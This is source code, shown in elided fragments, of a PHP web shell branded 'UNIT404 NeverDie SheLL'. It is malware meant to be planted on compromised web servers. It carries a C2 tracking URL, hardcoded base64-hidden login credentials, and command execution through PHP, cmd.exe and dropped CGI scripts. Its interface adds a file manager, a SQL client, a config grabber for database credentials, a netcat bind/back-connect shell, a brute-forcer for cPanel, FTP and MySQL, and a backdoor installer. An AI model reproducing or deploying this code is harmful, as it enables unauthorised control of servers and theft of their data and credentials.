...
function unit404_track() {
    $c2_url = "https://unit404.site/dashboard/unit404devileye.php"; 
    $key    = "UNIT404_404"; 
...
$GLOBALS['DB_NAME'] = $GLOBALS['UNIT404'];
...
if($GLOBALS['DB_NAME']['safemode'] == '1'){
    $__unit404_lockfile = sys_get_temp_dir().'/.unit404_lock_'.md5($_SERVER['REMOTE_ADDR']);
    $__unit404_max_attempts = 1000;
    $__unit404_lockout_time = 1800; // 30 menit

    // Cek apakah IP terkunci
    function __unit404_is_locked($lockfile, $max, $locktime){
    ...
    // Catat gagal login
    function __unit404_record_fail($lockfile){
    ...
    // Reset gagal login
    function __unit404_reset_fail($lockfile){
        if(file_exists($lockfile)) @unlink($lockfile);
    }

    // Generate token anti-CSRF
    function __unit404_token(){
        return md5($_SERVER['REMOTE_ADDR'].'_unit404_csrf_'.date('Y-m-d-H'));
    }

    // Handle logout
    if(isset($_GET['logout'])){
        @setcookie("UNIT404User", "", time()-3600, "/", "", false, true);
        @setcookie("UNIT404Pass", "", time()-3600, "/", "", false, true);
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }

    // Handle login POST
    if(isset($_POST['unit404_login_user']) && isset($_POST['unit404_login_pass']) && isset($_POST['unit404_token'])){
        if(!__unit404_is_locked($__unit404_lockfile, $__unit404_max_attempts, $__unit404_lockout_time)){
            
            $target_u = base64_decode('d2hz');
            $target_p = base64_decode('bWFkcmlkODg=');
            $hash_p   = 'baaf0ebafcf138cf941c7bb61dea507f1a83262de9bd81f2bb70d5bf1baad64b';

            if($_POST['unit404_token'] === __unit404_token() &&
               $_POST['unit404_login_user'] === $target_u && 
               $_POST['unit404_login_pass'] === $target_p){
                
                $__unit404_auth_token = hash('sha256', $target_u . $hash_p . '_unit404_secure_key');
                @setcookie("UNIT404User", $target_u, time()+86400*30, "/", "", false, true);
                @setcookie("UNIT404Pass", $__unit404_auth_token, time()+86400*30, "/", "", false, true);
                
                __unit404_reset_fail($__unit404_lockfile);
                header("Location: ".$_SERVER['PHP_SELF']);
                exit;
            } else {
                __unit404_record_fail($__unit404_lockfile);
    ...
    // Check cookie auth
    $unit404_logged_in = false;
    if(isset($_COOKIE['UNIT404User']) && isset($_COOKIE['UNIT404Pass'])){
        $__unit404_expected_token = hash('sha256', $GLOBALS['DB_NAME']['user'].$GLOBALS['DB_NAME']['pass'].'_unit404_secure_key');
        if($_COOKIE['UNIT404User'] === $GLOBALS['DB_NAME']['user'] && $_COOKIE['UNIT404Pass'] === $__unit404_expected_token){
            $unit404_logged_in = true;
        }
    }

    if(!$unit404_logged_in){
        $__unit404_locked = __unit404_is_locked($__unit404_lockfile, $__unit404_max_attempts, $__unit404_lockout_time);
...
define("__UNIT404_VERSION__", "\xE2\x88\x9E");
define("__UNIT404_UPDATE__", "2");
define("__UNIT404_CODE_NAME__", "NeverDie");
define("__UNIT404_DATA_FOLDER__", ""); // disabled
define("__UNIT404_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__UNIT404_SECRET_KEY__", __UNIT404_POST_ENCRYPTION__?_UNIT404SecretKey():'');
$GLOBALS['__UNIT404_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#ffffff",
		...
		"UNIT404+" => array(
			"key_color" => "#ffffff",
			"multi_selector" => array(
				".UNIT404_plus" => "color: {color};font-weight: unset;",
			)
		),
		...
		"editor_header_background" => array(
			"key_color" => "linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%)",
			"multi_selector" => array(
...
function decrypt_post($str){
	if(__UNIT404_POST_ENCRYPTION__){
		$pwd = __UNIT404_SECRET_KEY__;
...
function _UNIT404SecretKey(){
	$secret = @$_COOKIE["UNIT404SecretKey"];
	if(!isset($_COOKIE["UNIT404SecretKey"])){
		$secret = uniqid(mt_rand(), true);
		__UNIT404_set_cookie("UNIT404SecretKey", $secret);
	}
	return $secret;
}
function UNIT404_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		return $GLOBALS["DB_NAME"]["color"][$target];
	}else{
		$target = $GLOBALS["__UNIT404_COLOR__"][$target];
		if(is_array($target)){
...
function UNIT404CssLoadColors(){
	$css = "";
	foreach($GLOBALS['__UNIT404_COLOR__'] as $key => $value){
		if(!is_array($value)){
			$value = UNIT404_getColor($key);
...
echo '<script>';
foreach($UNIT404x as $UNIT404){
if(in_array($UNIT404,$find))
continue;
echo 'UNIT404'.$UNIT404."_=";
}
echo '""</script>';
}}
function _UNIT404_cgicmd($cmd,$lang="perl",$set_cookie=false){
	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
		return "";
	}
	if(isset($_COOKIE["UNIT404cgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){$recreate = false;
		if(isset($_COOKIE["UNIT404cgiapi"])){
			if(!@file_exists("UNIT404cgiapi/".$_COOKIE["UNIT404cgiapi"].".UNIT404")){
				$recreate = true;
				$lang = $_COOKIE["UNIT404cgiapi"];
			}
		}
		if(!isset($_COOKIE["UNIT404cgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				UNIT404WriteTocgiapi("aspx.aspx",$aspx);
			}else{
				UNIT404WriteTocgiapi($lang.".UNIT404",$source);
			}
			UNIT404cgihtaccess('cgi', "UNIT404cgiapi/");
		}else{
			$lang = $_COOKIE["UNIT404cgiapi"];
		}
		$cgi_ext = ".UNIT404";
		if($lang=="aspx"){
			$cgi_ext = ".aspx";}
		$cgi_url = __UNIT404_DATA_FOLDER__."/UNIT404cgiapi/".$lang.$cgi_ext;
		...
		if($is_curl){
			...
			$post = new UNIT404CURL();
			$data = $post->Send($address, "post", $cmd);
		}elseif($is_socket){
			$server = $_SERVER["SERVER_NAME"];
			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
			$data = _UNIT404_fsockopen($server,$uri,$cmd);
		}
		$out = "";
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__UNIT404_set_cookie("UNIT404cgiapi", $lang);
			}
			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
				$out = $res[1];
			}
		}elseif($lang=="perl"){
			return _UNIT404_cgicmd($cmd_pure,"py",$set_cookie);
		}elseif($lang=="py"){
			return _UNIT404_cgicmd($cmd_pure,"bash",$set_cookie);
		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
			return _UNIT404_cgicmd($cmd_pure,"aspx",$set_cookie);
		}else{
			if($set_cookie){
				__UNIT404_set_cookie("UNIT404cgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
function UNIT404Ex($in,$re=false,$cgi=true,$all=false){
	$data = _UNIT404_php_cmd($in,$re);
	if(empty($data)&&$cgi||$all){
		if($GLOBALS['sys']=='unix'){
			if(strlen(_UNIT404_php_cmd("whoami"))==0||$all){
				$cmd = _UNIT404_cgicmd($in);
				if(!empty($cmd)){
					return $cmd;
				}
			}
...
function _UNIT404_php_cmd($in,$re=false){
$out='';
try{
if($re)$in=$in." 2>&1";
...
$UNIT404Ws = new COM('WScript.shell');
$exec = $UNIT404Ws->exec('cmd.exe /c '.$_POST['UNIT4041']);
$stdout = $exec->StdOut();
$out=$stdout->ReadAll();
}
}catch(Exception $e){}
...
function _UNIT404_fsockopen($server,$uri,$post){
...
echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@UNIT404GetCwd()) . "/<br />";
...
echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@UNIT404GetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
...
$GLOBALS['sys']='unix';
$GLOBALS['home_cwd'] = @UNIT404GetCwd();
...
$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@UNIT404GetCwd());
if($GLOBALS['glob_chdir_false']){
	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @UNIT404GetCwd());
}
if($GLOBALS['sys'] == 'win'){
...
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_UNIT404_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
...
return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="UNIT404_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
}
function UNIT404Num(){
$args = func_get_args();
$UNIT404x = array();
...
<link href="'.__showicon('UNIT404mini').'" rel="icon" type="image/x-icon"/>
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ NeverDie SheLL | '.__UNIT404_CODE_NAME__.' SheLL v'.__UNIT404_VERSION__.' ::..</title>
<style type="text/css">';?>
...
.header, #meunlist, .foot {
  ...
  background: linear-gradient(to bottom, #050505 0, #040404 55%, #000000 100%);
  z-index: 0;
  overflow: hidden;
  padding: 5px;
  border-radius: 8px; 
...
.header::before, #meunlist::before, .foot::before {
  ...
  background-image: conic-gradient(transparent, #ff0000ff, #FFFFFF, transparent 30%);
...
.php-terminal-output{background:url(https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png) center/30% no-repeat #000 !important;}
...
var post_encryption_mode = ".(__UNIT404_POST_ENCRYPTION__?'true':'false').";";?>
var UNIT4041_="",UNIT4042_="",UNIT4043_="",UNIT4044_="",UNIT4045_="",UNIT4046_="",UNIT4047_="",UNIT4048_="",UNIT4049_="",UNIT40410_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,UNIT404_can_add_opt=!1,UNIT404_before_do_action_id="",UNIT404_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_UNIT404_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],UNIT404_current_fm_id=1,UNIT404_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.UNIT4041.value=null!=t?t:"",d.mf.UNIT4042.value=null!=i?i:"",d.mf.UNIT4043.value=null!=l?l:"",d.mf.UNIT4044.value=null!=o?o:"",d.mf.UNIT4045.value=null!=r?r:"",d.mf.UNIT4046.value=null!=n?n:"",d.mf.UNIT4047.value=null!=s?s:"",d.mf.UNIT4048.value=null!=c?c:"",d.mf.UNIT4049.value=null!=f?f:"",d.mf.UNIT40410.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=UNIT404_current_fm_id,t="a="+UNIT404b64("FilesMan")+"&c="+UNIT404b64(e.c.value)+"&UNIT4041="+UNIT404b64(e.UNIT4041.value)+"&ajax="+UNIT404b64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+UNIT404b64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.UNIT4041.value)return!1;switch(UNIT404loader("filesman_holder_"+a,"block"),e.UNIT4041.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){UNIT404loader("filesman_holder_"+a,"none"),UNIT404FmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",UNIT404InitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_UNIT404_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),UNIT404ClearAjax(l)):4==o.readyState&&200!=o.status&&(UNIT404AjaxError(o.status,l,o.statusText,o.responseText),UNIT404ClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function UNIT404ClearAjax(e){_UNIT404_AJAX_.hasOwnProperty(e)&&delete _UNIT404_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=UNIT404_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",UNIT404b64(e.a.value)),l.append("c",UNIT404b64(e.c.value)),l.append("UNIT4041",UNIT404b64(e.UNIT4041.value)),l.append("charset",UNIT404b64(e.charset.value)),l.append("ajax",UNIT404b64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_UNIT404_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":UNIT404AjaxError(a.status,"upload_area",a.statusText,a.responseText),UNIT404ClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx"id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><arow="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),UNIT404ShowNotification("File(s) uploaded successfully","Uploader"),UNIT404FmngrContextRow()}else UNIT404ShowNotification("Folder has no permission...","Uploader","error");UNIT404CheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function UNIT404CheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,UNIT4041,UNIT4042,UNIT4043,UNIT4044,UNIT4045,UNIT4046,UNIT4047,UNIT4048,UNIT4049,UNIT40410,charset){var fm_id=0==UNIT404_fm_id?UNIT404_current_fm_id:UNIT404_fm_id,fm_id2=UNIT404_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=UNIT404_before_do_action_id;0==UNIT404_fm_id&&(set(a,c,UNIT4041,UNIT4042,UNIT4043,UNIT4044,UNIT4045,UNIT4046,UNIT4047,UNIT4048,UNIT4049,UNIT40410,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=UNIT4042&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(UNIT404loader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?UNIT404loader(g_action_id,"block"):"FilesTools"!=a&&"download"!=UNIT4042&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),UNIT404loader(g_action_id,"block"));for(var data="a="+UNIT404b64(a)+"&c="+UNIT404b64(d_mf_c)+"&",i=1;i<=10;i++)data+="UNIT404"+i+"="+UNIT404b64(eval("d.mf.UNIT404"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+UNIT404b64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+UNIT404b64("true"),"FilesTools"==a&&"download"==UNIT4042){UNIT404LoaderOnTop("none");var dl=$("dlForm");return dl.a.value=UNIT404b64("dlfile"),dl.c.value=UNIT404b64(d_mf_c),dl.file.value=UNIT404b64(UNIT4041),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(UNIT404LoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){UNIT404loader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=UNIT404GetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,UNIT404FmngrContextRow(),"function"==typeof UNIT4041&&UNIT4041(e),UNIT404CheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||UNIT404loader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&UNIT404LoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&UNIT404ColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(UNIT404loader(UNIT4043,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}UNIT404loader(t,"none")},!1,UNIT4043))}function UNIT404GetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function UNIT404loader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="UNIT404AjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="UNIT404team-loader-text">UNIT 404</div><div class="UNIT404-ajax-error"></div><img src=\'https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),UNIT404loader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+UNIT404b64("Sql")+"&UNIT4041="+UNIT404b64("query")+"&UNIT4042=&c="+UNIT404b64(c_)+"&charset="+UNIT404b64("UTF-8")+"&type="+UNIT404b64(n)+"&sql_host="+UNIT404b64(i)+"&sql_login="+UNIT404b64(l)+"&sql_pass="+UNIT404b64(o)+"&sql_base="+UNIT404b64(r)+"&sql_count="+UNIT404b64(s)+"&current_mysql_id="+UNIT404b64(a)+"&ajax="+UNIT404b64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),UNIT404loader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<labelclass="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;&#128193; Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function UNIT404_searcher_tool(e){switch(e){case"all":case"dirs":_UNIT404Set(!0,"Disabled");break;case"files":_UNIT404Set(!1,"php")}}function _UNIT404Set(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function UNIT404AjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".UNIT404-ajax-error").innerHTML=e+" ( "+t+firewall+" )",UNIT404ShowNotification(t,"Ajax","error"))}}function UNIT404InitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu >a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){UNIT404FilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;UNIT404SortMenuItems(["newtab"]),UNIT404RightClickMenu(i,l),e.preventDefault()})})}function UNIT404RightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function UNIT404SortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function UNIT404AceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=UNIT404_ace_editors.editor;"eval"==i&&(l=UNIT404_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("UNIT404_ace_"+a+"_"+i,t,2012)}function UNIT404AceChangeWrapMode(e,a){var t=UNIT404_ace_editors.editor;"eval"==a&&(t=UNIT404_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function UNIT404AceChangeFontSize(e,a,t){var i=UNIT404_ace_editors.editor;"eval"==e&&(i=UNIT404_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("UNIT404_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=UNIT404_ace_editors.editor&&null!=UNIT404_ace_editors.editor){for(var a in UNIT404_ace_editors.editor)UNIT404_ace_editors.editor[a].destroy();UNIT404_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=UNIT404_ace_editors.eval){for(var a in UNIT404_ace_editors.eval)UNIT404_ace_editors.eval[a].destroy();UNIT404_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in 